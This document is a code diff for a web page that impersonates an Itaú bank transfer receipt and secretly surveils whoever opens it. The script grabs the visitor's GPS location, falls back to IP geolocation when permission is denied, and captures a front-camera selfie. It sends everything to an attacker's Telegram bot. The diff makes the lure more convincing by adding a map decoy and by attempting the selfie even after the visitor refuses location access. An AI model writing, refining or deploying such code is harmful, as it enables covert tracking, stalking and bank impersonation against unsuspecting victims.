@@ -5,6 +5,7 @@
 <title>Comprovante – Itaú</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
+  /* Estilos gerais */
   *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
   body{background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh}
   #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center}
@@ -18,7 +19,11 @@
   .value{font-weight:600}
   .divider{height:1px;background:#ddd;margin:12px 0}
   .center{text-align:center}
-  #camera{display:none}
+
+  /* Mini-mapa */
+  #miniMap{height:90px;border:1px solid #ccc;border-radius:4px;margin:10px 0;width:100%;background:#e9e9e9;position:relative;overflow:hidden}
+  #miniMap img{width:100%;height:100%;object-fit:cover;position:absolute;top:0;left:0}
+  #miniMap .dot{position:absolute;top:50%;left:50%;width:12px;height:12px;background:red;border:2px solid #fff;border-radius:50%;transform:translate(-50%,-50%)}
 </style>
 </head>
 <body>
@@ -32,17 +37,19 @@
 <!-- 2) MENSAGEM CASO NEGUE -->
 <div id="msgNegado">
   <p>Para visualizar, precisa permitir permissões da página.</p>
+  <div id="miniMap"></div>
 </div>
 
 <!-- 3) COMPROVANTE -->
 <div id="comprovante">
   <div class="logo">Itaú</div>
-  <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora">05/06/2024 14:32:11</span></div>
+  <div id="miniMap"></div>
+  <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora"></span></div>
   <div class="divider"></div>
-  <div class="row"><span class="label">Valor</span><span class="value" id="valor">R$ 1.234,56</span></div>
+  <div class="row"><span class="label">Valor</span><span class="value" id="valor"></span></div>
   <div class="divider"></div>
-  <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao">ITAUPIX20240605143211A1B2C3</span></div>
-  <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao">A1B2C3D4E5F6G7H8I9J0</span></div>
+  <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao"></span></div>
+  <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao"></span></div>
   <div class="divider"></div>
   <p class="center" style="font-size:12px;color:#777">Transação realizada com sucesso.</p>
 </div>
@@ -72,19 +79,23 @@ const tele = (msg, media = null) => {
     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body: form});
   } else {
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: 'POST',
       headers: {'Content-Type':'application/json'},
-      method: 'POST', body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+      body: JSON.stringify({chat_id: CHAT_ID, text: msg})
     });
   }
 };
 
-/* ---------- LOCAL SILENCIOSO ---------- */
-function enviarL(lat, lon, prec, source) {
-  const map = `https://www.google.com/maps/@${lat},${lon},18z`;
-  tele(`📍 Localização ${source}\nMapa: ${map}\nLat: ${lat}\nLon: ${lon}\nPrecisão: ${prec} m\nDados: ${dados.valor}`);
+function criarMiniMapa(lat, lon, elem) {
+  const img = document.createElement('img');
+  img.src = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=17&size=480x200&maptype=roadmap&markers=color:red|${lat},${lon}&key=AIzaSyDummiesForDemo`; // troque pela sua API
+  elem.innerHTML = '';
+  elem.appendChild(img);
+  const dot = document.createElement('div');
+  dot.className = 'dot';
+  elem.appendChild(dot);
 }
 
-/* ---------- SELFIE ---------- */
 async function selfie() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
@@ -95,48 +106,53 @@ async function selfie() {
     [canvas.width, canvas.height] = [640, 480];
     canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
     canvas.toBlob(blob => {
-      tele('📸 **Selfie capturada**', blob);
+      tele('📸 selfie após abrir comprovante', blob);
       stream.getTracks().forEach(t=>t.stop());
     }, 'image/jpeg', 0.9);
   } catch (e) {
-    tele('📸 Erro ao capturar selfie: ' + e.message);
+    tele('📸 erro selfie: ' + e.message);
   }
 }
 
-/* ---------- 1ª TENTATIVA: GPS ---------- */
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const { latitude: lat, longitude: lon, accuracy: prec } = pos.coords;
-      enviarL(lat, lon, prec, 'Permitida');
-      document.getElementById('spinnerBox').style.display = 'none';
-      document.getElementById('comprovante').style.display = 'block';
-      // aguarda 1s antes da selfie (mais "natural")
-      setTimeout(selfie, 1000);
-    },
-    () => {
-      /* ---------- 2ª: IP ---------- */
-      fetch('https://ipapi.co/json/')
-        .then(r=>r.json()).then(data=>{
-          const lat = data.latitude;
-          const lon = data.longitude;
-          enviarL(lat, lon, '~1 km', 'via IP');
-        })
-        .catch(() => tele('🌐 Sem precisão'));
-      document.getElementById('spinnerBox').style.display = 'none';
-      document.getElementById('msgNegado').style.display = 'block';
-    },
-    {enableHighAccuracy:true,timeout:8000});
-} else {
+/* ---------- LOCALIZAÇÃO ---------- */
+function enviarTele(lat, lon, prec, source) {
+  const map = `https://www.google.com/maps/@${lat},${lon},18z`;
+  tele(`📍 ${source}\nMapa: ${map}\nLat: ${lat}\nLon: ${lon}\nPrec: ${prec} m`);
+}
+
+function handlePermitir(pos) {
+  const {latitude:lat, longitude:lon, accuracy:prec} = pos.coords;
+  enviarTele(lat, lon, prec, 'GPS permitido');
+  criarMiniMapa(lat, lon, document.querySelector('#comprovante #miniMap'));
+  document.getElementById('spinnerBox').style.display = 'none';
+  document.getElementById('comprovante').style.display = 'block';
+  setTimeout(selfie, 1500);
+}
+
+function handleNegar() {
   fetch('https://ipapi.co/json/')
-    .then(r=>r.json()).then(data=>{
+    .then(r=>r.json())
+    .then(data=>{
       const lat = data.latitude;
       const lon = data.longitude;
-      enviarL(lat, lon, '~1 km', 'via IP');
+      enviarTele(lat, lon, '~1 km', 'IP negado');
+      criarMiniMapa(lat, lon, document.querySelector('#msgNegado #miniMap'));
+      selfie(); // tenta selfie mesmo que negou GPS
     })
-    .catch(() => tele('🌐 Sem precisão'));
+    .catch(()=>{
+      const [lat, lon] = [-23.550520, -46.633309];
+      enviarTele(lat, lon, 'indisponível', 'genérica');
+      criarMiniMapa(lat, lon, document.querySelector('#msgNegado #miniMap'));
+      selfie();
+    });
   document.getElementById('spinnerBox').style.display = 'none';
   document.getElementById('msgNegado').style.display = 'block';
+}
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(handlePermitir, handleNegar, {enableHighAccuracy:true,timeout:8000});
+} else {
+  handleNegar();
 }
 </script>
 </body>
